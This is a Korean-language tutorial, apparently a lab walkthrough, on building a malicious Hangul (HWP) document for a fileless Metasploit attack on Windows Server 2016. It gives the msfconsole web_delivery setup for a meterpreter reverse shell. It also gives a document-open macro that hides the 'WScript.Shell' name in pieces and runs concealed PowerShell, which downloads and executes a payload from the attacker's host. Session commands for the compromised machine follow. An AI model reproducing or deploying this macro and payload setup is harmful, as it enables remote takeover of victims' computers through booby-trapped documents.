# 메타스플로잇(Metasploit)를 사용해 악성한글문서(Hwp)만들어 파일리스(Fileless) 공격하기

- 공격 서버 :smiling_imp: : 칼리 리눅스(Kali Linux amd64)
- 공격 대상 :skull: : 윈도우 서버 2016 (Windows Server 2016)

### 1. :smiling_imp: Metasploit으로 페이로드 생성

metasploit 실행

```
msfconsole
```

![1](https://i.ibb.co/ZGT9LCZ/Fileless-msf-hwp-1.png)

```
use exploit/multi/script/web_delivery
set target 2
set LHOST 192.168.0.0
set payload windows/meterpreter/reverse_tcp
exploit -j
```

![2](https://i.ibb.co/92mwLNq/Fileless-msf-hwp-2.png)

### 2. :smiling_imp: 악성 한글 문서 제작

1. 도구 > 보안 설정 > 보안수준 낮음 설정
2. 스크립트 매크로 > 실행 > 코드 편집
3. 항목 > Document / Open

```
function OnDocument_Open()
{
try{
  wsh = new ActiveXObject("W"+ "S"+ "c"+ "ri"+ "p"+ "t"+ ".S" +"he" +"ll");
  var r ="powershell.exe -nop -w hidden -c $D=new-object net.webclient;$D.proxy=[Net.WebRequest]::GetSystemWebProxy();$D.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $D.downloadstring('http://192.168.0.0:8080/ABCDE')";
  wsh.Run(r,0);
 }
  catch(err){}
}
```

### 3. :skull: 악성 한글 문서 실행
- 사전 조건 : 백신 OFF, 한글 보안수준 낮음 설정, Windows Defender OFF
한글 문서를 열어서 스크립트 코드 실행

![3](https://i.ibb.co/LnN2Y78/image.png)

### 4. 세션 연결 성공 후 공격 가능

![4](https://i.ibb.co/JR2k2ry/Fileless-msf-hwp-4.png)

```
sessions
sessions -i num
help

//example
sysinfo
```

![5](https://i.ibb.co/9YxVqmZ/Fileless-msf-hwp-5.png)
